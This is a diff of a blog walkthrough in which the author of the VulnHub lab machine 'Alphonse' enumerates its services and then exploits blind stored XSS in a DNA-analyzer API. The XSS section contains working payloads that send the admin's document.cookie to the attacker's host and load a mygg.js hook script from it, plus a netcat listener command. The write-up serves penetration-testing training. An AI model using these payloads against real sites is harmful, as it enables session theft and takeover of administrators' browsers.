@@ -12,6 +12,16 @@ comments: true
 
 The following is a walkthrough for one of the machines I have created and submitted to VulnHub for my <a href="https://www.vulnhub.com/series/sp,189/">SP series</a>. Since I created the VM, I'm biased on how to solve it, but I have tried to tackle it from an objective point of view. Before we go on, a fun thing to know about this VM is that it was inspired from a real penetration test and the reason mygg.js was built. Personally, I regard the difficulty level as intermediate.
 
+## Prep
+
+Let's add alphonse to /etc/hosts to make things more trivial.
+```bash
+root@kali:~# cat /etc/hosts         
+127.0.0.1       localhost
+127.0.1.1       kali
+192.168.0.36    alphonse
+```
+
 ## Enumeration
 
 ### nmap
@@ -19,7 +29,7 @@ The following is a walkthrough for one of the machines I have created and submit
 A port scan gives us a lot to go after, with multiple interesting services. We can already see some files on the FTP server with anonymous login enabled and a webserver, which we should do some content discovery on. We should also see if we can gather some information from the smb service.
 
 ```
-root@kali:~# nmap -sTVC 192.168.0.36 -p- -n
+root@kali:~# nmap -sTVC alphonse -p- -n
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-16 15:58 EDT
 Nmap scan report for 192.168.0.36
 Host is up (0.00054s latency).
@@ -60,7 +70,7 @@ root@kali:~#
 enum4linux doesn't give us that much information, other than some default shares.
 
 ```
-root@kali:~# enum4linux 192.168.0.36
+root@kali:~# enum4linux alphonse
 ---
 //192.168.0.36/print$   Mapping: DENIED, Listing: N/A
 //192.168.0.36/IPC$ [E] Can't understand response:
@@ -72,7 +82,7 @@ root@kali:~# enum4linux 192.168.0.36
 We can use my new favorite content discovery tool ffuf to enumerate content on the webserver. Unfortunately, it doesn't find anything useful with the basic big.txt in Kali.
 
 ```
-root@kali:~/go/bin# ffuf -w /usr/share/wordlists/dirb/big.txt -u http://192.168.0.36/FUZZ
+root@kali:~/go/bin# ffuf -w /usr/share/wordlists/dirb/big.txt -u http://alphonse/FUZZ
 .htaccess               [Status: 403, Size: 296, Words: 22, Lines: 12]
 .htpasswd               [Status: 403, Size: 296, Words: 22, Lines: 12]
 server-status           [Status: 403, Size: 300, Words: 22, Lines: 12]
@@ -85,7 +95,7 @@ root@kali:~/go/bin#
 We can use the build-in ftp tool to browse and download the DNAnalyzer.apk file. Interesting.
 
 ```
-root@kali:~# ftp 192.168.0.36
+root@kali:~# ftp alphonse
 Connected to 192.168.0.36.
 220 (vsFTPd 3.0.3)
 Name (192.168.0.36:root): anonymous
@@ -159,7 +169,7 @@ doPostRequest("http://alphonse/dnanalyzer/api/register.php", hashMap, paramCallb
 
 The register.php file do exist as proven by doing a request to it. It complains about some missing arguments. We also learn that the API use JSON for information exchange, which will be important when we will be constructing requests.
 ```
-root@kali:~# curl http://192.168.0.36/dnanalyzer/api/register.php
+root@kali:~# curl http://alphonse/dnanalyzer/api/register.php
 <br />
 <b>Notice</b>:  Undefined index: username in <b>/var/www/html/dnanalyzer/api/register.php</b> on line <b>22</b><br />
 <br />
@@ -171,7 +181,7 @@ root@kali:~# curl http://192.168.0.36/dnanalyzer/api/register.php
 
 Let's try an make a test user:
 ```
-root@kali:~# curl -i -d "username=test&password=test&dna_string=test" http://192.168.0.36/dnanalyzer/api/register.php
+root@kali:~# curl -i -d "username=test&password=test&dna_string=test" http://alphonse/dnanalyzer/api/register.php
 HTTP/1.1 200 OK
 Date: Wed, 16 Sep 2020 20:42:03 GMT
 Server: Apache/2.4.38 (Debian)
@@ -189,7 +199,7 @@ root@kali:~#
 And now logging in with it:
 
 ```
-root@kali:~# curl -i -d "username=test&password=test" http://192.168.0.36/dnanalyzer/api/login.php
+root@kali:~# curl -i -d "username=test&password=test" http://alphonse/dnanalyzer/api/login.php
 HTTP/1.1 200 OK
 Date: Wed, 16 Sep 2020 20:42:55 GMT
 Server: Apache/2.4.38 (Debian)
@@ -207,7 +217,7 @@ root@kali:~#
 Looks like it's working, and we are given a JWT token. What can we do from here? Let's go back to do some more enumeration of the newly discovered web directory.
 
 ```
-root@kali:~# ffuf -w /usr/share/wordlists/dirb/big.txt -u http://192.168.0.36/dnanalyzer/FUZZ
+root@kali:~# ffuf -w /usr/share/wordlists/dirb/big.txt -u http://alphonse/dnanalyzer/FUZZ
 .htaccess               [Status: 403, Size: 307, Words: 22, Lines: 12]
 .htpasswd               [Status: 403, Size: 307, Words: 22, Lines: 12]
 api                     [Status: 301, Size: 321, Words: 20, Lines: 10]
@@ -220,14 +230,18 @@ root@kali:~#
 The portal folder looks interesting, which provides a html page with a login form. However, providing our newly created user didn't get us inside. Maybe this is an admin portal?
 
 ```
-root@kali:~# curl http://192.168.0.36/dnanalyzer/portal/
+root@kali:~# curl http://alphonse/dnanalyzer/portal/
 <form action="" method="POST"><input name="user" type="text" placeholder="username" /></br><input name="pass" type="password" placeholder="password" /></br><input name="login" type="submit" value="Login" /></form>
 root@kali:~# 
 ```
 
 ### Out-of-bound XSS
 
-If this is an admin portal and an administrator is viewing user information, maybe we can trigger an XSS. Since we are very much blind here, we will send a simple out-of-bounds payload, loading an image from our attacking machine (192.168.0.34). Be sure to open a listener on the attacking machine first `nc -nlvp 80`.
+If this is an admin portal and an administrator is viewing user information, maybe we can trigger an XSS. Since we are very much blind here, we will send a simple out-of-bounds payload, loading an image from our attacking machine (192.168.0.34). Be sure to open a listener on the attacking machine first. 
+
+```
+nc -nlvp 80
+```
 
 ```
 root@kali:~# curl -i -d "username=test2&password=test2&dna_string=<img src='http://192.168.0.34/x'>" http://192.168.0.36/dnanalyzer/api/register.php
@@ -256,8 +270,7 @@ Accept-Encoding: gzip, deflate
 Referer: http://127.0.0.1/dnanalyzer/portal/index.php
 Connection: keep-alive
 ```
-
-Now, let's try to check if there are any cookies by sending document.cookie back to our server.
+Also, here we learn about the portal page. Now, let's try to check if there are any cookies by sending document.cookie back to our server.
 
 ```
 root@kali:~# curl -i -d "username=test4&password=test4&dna_string=<svg/onload=\"var x=document.createElement('img');x.src='http://192.168.0.34/'%2Bdocument.cookie;document.body.appendChild(x);\">" http://192.168.0.36/dnanalyzer/api/register.php
@@ -284,7 +297,7 @@ Cache-Control: no-cache
 However, there is another trick we can use. We can use a tool called mygg.js to use XSS to browse through the admin's browser to take a look at the site via their authenticated session. Follow the basic installation at https://github.com/dsolstad/mygg.js and edit the configuration in the top section of the file. Change the domain variable to your attacking IP address before starting it the tool `$ node mygg.js`. After this we can change the XSS payload and use mygg's hook instead.
 
 ```
-root@kali:~# curl -i -d "username=test4&password=test&dna_string=<svg/onload=\"var x=document.createElement('script');x.src='http://192.168.0.34/hook.js';document.head.appendChild(x);\">" http://192.168.0.36/dnanalyzer/api/register.php
+root@kali:~# curl -i -d "username=test4&password=test&dna_string=<svg/onload=\"var x=document.createElement('script');x.src='http://192.168.0.34/hook.js';document.head.appendChild(x);\">" http://alphonse/dnanalyzer/api/register.php
 ```
 After some minutes we can see that we have a new hooked browser in the console of mygg. We also see which URL it was hooked from. 
 
